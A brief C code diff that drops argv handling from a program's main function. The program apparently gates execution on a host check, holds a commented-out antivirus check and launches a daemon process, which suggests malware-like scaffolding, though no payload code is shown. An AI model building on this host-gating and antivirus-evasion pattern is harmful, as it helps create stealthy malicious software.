@@ -3,14 +3,10 @@
 #include "validators.h"
 
 
-int main(int argc, char **argv) {
+int main(void) {
 	char *arg = NULL;
 	host_profile host_info;
 	Validation_Status s;
-
-	if(argc > 1) {
-		arg = argv[1];
-	}
 
 	if((s = check_if_host_is_correct(&host_info)) != CORRECT_HOST) {
 		#ifdef DEBUG
@@ -22,6 +18,6 @@ int main(int argc, char **argv) {
 
 	//check_for_antivirus();
 
-	create_deamon_process(arg);
+	create_deamon_process();
 
 }
